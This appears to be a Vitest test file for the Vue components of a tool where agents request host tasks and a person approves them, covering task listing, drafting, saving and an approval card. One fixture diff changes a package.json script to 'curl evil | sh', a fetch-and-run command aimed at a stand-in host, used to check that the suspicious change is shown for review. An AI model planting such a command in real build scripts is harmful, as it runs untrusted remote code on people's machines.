// @vitest-environment happy-dom
import { flushPromises, mount } from '@vue/test-utils';
import { describe, expect, it } from 'vitest';
import TaskAskCard from '../../src/renderer/src/components/TaskAskCard.vue';
import TasksPanel from '../../src/renderer/src/components/TasksPanel.vue';
import type { HostTaskInfo, IntegrationAsk, YawbleApi, TaskRun } from '../../src/shared/api';

function fakeApi(answers: Record<string, (params: any) => unknown>) {
  const calls: { method: string; params: any }[] = [];
  const api: YawbleApi = {
    getInfo: async () => { throw new Error('no'); },
    getAvailableBackends: async () => [],
    call: async (method: string, params?: Record<string, unknown>) => {
      calls.push({ method, params });
      const answer = answers[method];
      if (!answer) throw new Error(`unexpected ${method}`);
      return answer(params) as any;
    },
    onEvent: () => () => {},
    openTerminal: async () => {},
    pickFolder: async () => null,
  };
  return { api, calls };
}

const teams = [{ id: 3, name: 'ops', repoPath: null, members: 2, running: 0, queued: 0 }];
const run: TaskRun = {
  id: 14, task: 'e2e', teamId: 3, state: 'done', startedAt: '2026-11-09T20:00:00Z', endedAt: '2026-11-09T20:06:52Z', commit: 'abcdef1234567890', headAfter: 'abcdef1234567890',
  definitionHash: 'aaaaaaaaaaaa', filesHash: 'bbbbbbbbbbbb', program: 'C:\\npm.cmd', exitCode: 1, timedOut: false, killedBy: null, outputBytes: 1200, truncated: false,
  logPath: 'C:\\docs\\task-runs\\e2e-14.log', dirtyAfter: true, askId: 31, requestedBy: 'ops/Ada', missingEnv: null,
};
const task: HostTaskInfo = {
  id: 1, def: { name: 'e2e', repo: 'main', program: 'npm', args: ['run', 'test:e2e'], workdir: 'shell', timeoutSeconds: 900, envNames: [], watch: [], pinMode: 'files', commandLineOnly: false },
  commandLine: 'npm run test:e2e', approval: 'always-but-changed', approvedAt: '2026-11-09T19:00:00Z', approvedCommit: '1111111122222222', approvedBy: 'me',
  programResolved: 'C:\\npm.cmd', commit: 'abcdef1234567890', pinned: ['shell/package.json'], warnings: [], problem: null, runningRunId: null, pendingAskId: null, lastRun: run,
  updatedAt: '2026-11-09T19:00:00Z', updatedBy: 'me',
};

describe('host tasks tab', () => {
  it('lists a task with its approval state and last run, and its run record with the log', async () => {
    const { api } = fakeApi({
      'tasks.list': () => ({ tasks: [task], repos: ['main'] }),
      'tasks.runs': () => [run],
    });
    const w = mount(TasksPanel, { props: { api, teams } });
    await flushPromises();
    expect(w.find('[data-test=task-e2e]').text()).toContain('npm run test:e2e');
    expect(w.find('[data-test=task-approval]').text()).toBe('Always, changed: will ask');
    await w.find('[data-test=task-run-14] td').trigger('click');
    expect(w.find('[data-test=run-log]').text()).toContain('e2e-14.log');
    expect(w.text()).toContain('left with uncommitted changes');
  });

  it('a draft fills the form but nothing is saved until Save; Save sends the definition and Run now / Stop use the person RPCs', async () => {
    const { api, calls } = fakeApi({
      'tasks.list': () => ({ tasks: [], repos: ['main'] }),
      'tasks.runs': () => [],
      'tasks.preview': () => ({ problem: null, programResolved: 'C:\\npm.cmd', commit: 'abcdef1234567890', pinned: ['shell/package.json'], warnings: [], commandLineOnly: false }),
      'tasks.save': () => ({ ok: true, id: 1 }),
    });
    const w = mount(TasksPanel, { props: { api, teams } });
    await flushPromises();
    await w.find('[data-test=task-draft-e2e]').trigger('click');
    await flushPromises();
    expect(calls.some((c) => c.method === 'tasks.save')).toBe(false);
    expect((w.find('[data-test=task-program]').element as HTMLInputElement).value).toBe('npm');
    expect(w.find('[data-test=task-preview]').text()).toContain('shell/package.json');
    await w.find('[data-test=task-save]').trigger('click');
    await flushPromises();
    const save = calls.find((c) => c.method === 'tasks.save')!;
    expect(save.params.def).toMatchObject({ name: 'e2e', program: 'npm', args: ['run', 'test:e2e'], workdir: 'shell', timeoutSeconds: 900, watch: ['shell/playwright.config.ts'] });
  });
});

describe('task ask card', () => {
  const ask: IntegrationAsk = {
    id: 31, at: '', integration: 'task:e2e', teamId: 3, member: 'ops/Ada', command: 'task e2e', reason: 'check <b>my</b> change', workflow: 9, task: true, taskName: 'e2e', commit: 'abcdef1234567890',
    detail: {
      commit: 'abcdef1234567890', program: 'C:\\npm.cmd', workdir: 'C:\\repo\\shell', args: ['run', 'test:e2e'], timeout_s: 900, env_names: [], pin_mode: 'files', pinned: ['shell/package.json'], warnings: [], standingApproval: true,
      changed: {
        approvedCommit: '1111111122222222', currentCommit: 'abcdef1234567890', diffAvailable: true, definitionHashChanged: false, filesHashChanged: true, definition: [],
        files: [{ path: 'shell/package.json', change: 'changed', oldBlob: 'aaaaaaaa11', newBlob: 'bbbbbbbb22', diff: '-  "test:e2e": "playwright test"\n+  "test:e2e": "curl evil | sh"' }],
      },
    },
  };

  it('shows the agent reason as plain text, the changed file with its diff, and offers once / always / decline', async () => {
    const w = mount(TaskAskCard, { props: { ask } });
    expect(w.find('[data-test=task-ask-reason]').text()).toBe('check <b>my</b> change');
    expect(w.find('[data-test=task-ask-reason] b').exists()).toBe(false);
    expect(w.find('[data-test=task-ask-file]').text()).toContain('shell/package.json');
    expect(w.find('.diff').text()).toContain('curl evil | sh');
    await w.find('[data-test=task-ask-once]').trigger('click');
    await w.find('[data-test=task-ask-always]').trigger('click');
    await w.find('input').setValue('no');
    await w.find('[data-test=task-ask-decline]').trigger('click');
    expect(w.emitted('once')).toHaveLength(1);
    expect(w.emitted('always')).toHaveLength(1);
    expect(w.emitted('decline')![0]).toEqual(['no']);
  });
});
